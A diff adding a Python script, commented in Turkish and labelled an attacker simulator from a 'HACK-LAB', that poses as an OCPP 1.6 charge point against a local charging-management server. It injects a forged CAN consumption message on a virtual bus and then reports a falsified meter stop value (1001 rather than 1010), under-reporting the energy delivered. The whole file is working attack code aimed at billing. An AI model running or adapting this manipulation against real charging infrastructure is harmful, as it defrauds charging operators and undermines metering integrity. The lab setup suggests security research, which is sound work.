@@ -1,0 +1,97 @@
+import asyncio
+import logging
+import can
+from ocpp.v16 import ChargePoint as cp
+from ocpp.v16 import call
+from ocpp.v16.enums import RegistrationStatus
+from websockets.client import connect
+
+logging.basicConfig(level=logging.INFO)
+
+# 1. SALDIRGAN/SİMÜLATÖR SINIFI
+class ChargePoint(cp):
+
+    # Sunucudan BootNotification yanıtı geldiğinde tetiklenir
+    async def send_boot_notification(self):
+        request = call.BootNotification(
+            charge_point_model="EV-Sim-001",
+            charge_point_vendor="HACK-LAB",
+        )
+        response = await self.call(request)
+
+        if response.status == RegistrationStatus.accepted:
+            logging.info("CPMS'e başarılı şekilde bağlandı. Simülasyon başlıyor...")
+            # Sunucu kabul ettikten sonra şarjı başlat
+            await self.start_simulated_charge()
+        else:
+            logging.error("CPMS bağlantıyı reddetti.")
+
+    # Ana simülasyon ve manipülasyon
+    async def start_simulated_charge(self):
+        start_meter = 1000 # Başlangıç sayaç değeri (1000 kWh)
+        
+        try:
+            # Yetkilendirme ve Şarj Başlatma
+            await self.call(call.Authorize(id_tag='A1B2C3D4'))
+            
+            start_resp = await self.call(call.StartTransaction(
+                connector_id=1,
+                id_tag='A1B2C3D4',
+                meter_start=start_meter, 
+                timestamp='2025-11-11T14:35:00.000Z'
+            ))
+            self.transaction_id = start_resp.transaction_id
+            logging.info(f"Şarj Başlatıldı. Transaction ID: {self.transaction_id}")
+            
+            # --- CAN Verisi Manipülasyonu Simülasyonu ---
+            await asyncio.sleep(3)
+            
+            # Sanal CAN arayüzü
+            bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
+            
+            # MANİPÜLE EDİLMİŞ Tüketim Mesajı (Sadece 1 kWh tüketilmiş gibi)
+            manipulated_data = [0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+            manipulated_msg = can.Message(arbitration_id=0x7DF, data=manipulated_data)
+            bus.send(manipulated_msg)
+            logging.error("CAN BUS: MANİPÜLE EDİLMİŞ tüketim mesajı (1 kWh) gönderildi!")
+            bus.shutdown() 
+            
+            # 4. StopTransaction (Şarjı Bitir)
+            # Sayaç 1000'den başladı. Manipüle edilmiş CAN verisine göre 1 kWh tüketildi.
+            meter_stop_value = start_meter + 1 # 1000 + 1 = 1001 (Manipüle edilmiş bitiş)
+            
+            await asyncio.sleep(5) 
+            
+            await self.call(call.StopTransaction(
+                meter_stop=meter_stop_value, # MANİPÜLE EDİLMİŞ SON DEĞER (1001)
+                timestamp='2025-11-11T14:36:00.000Z',
+                transaction_id=self.transaction_id
+            ))
+            logging.critical(f"OCPP: StopTransaction gönderildi. Meter Bitiş: {meter_stop_value} kWh. (Normalde 1010 olmalıydı!)")
+        
+        except Exception as e:
+            logging.error(f"Simülasyon sırasında hata: {e}")
+        
+        finally:
+            # Simülasyon bittiğinde bağlantıyı düzgünce kapat
+            await self.stop()
+
+# 2. İSTEMCİ BAŞLATMA
+async def main():
+    # CPMS, 8080 portunda dinliyor. CP istemcisi ona bağlanacak.
+    # NOT: URL'nin sonundaki 'CP_Lab1' sunucu tarafından ID olarak kullanılacak
+    async with connect(
+        'ws://127.0.0.1:8888/CP_Lab1', 
+        subprotocols=['ocpp1.6']
+    ) as websocket:
+        
+        charge_point = ChargePoint('CP_Lab1', websocket)
+        
+        # İstemciyi başlat ve sunucudan BootNotification yanıtı bekle
+        await asyncio.gather(
+            charge_point.start(), 
+            charge_point.send_boot_notification(),
+        )
+
+if __name__ == '__main__':
+    asyncio.run(main())
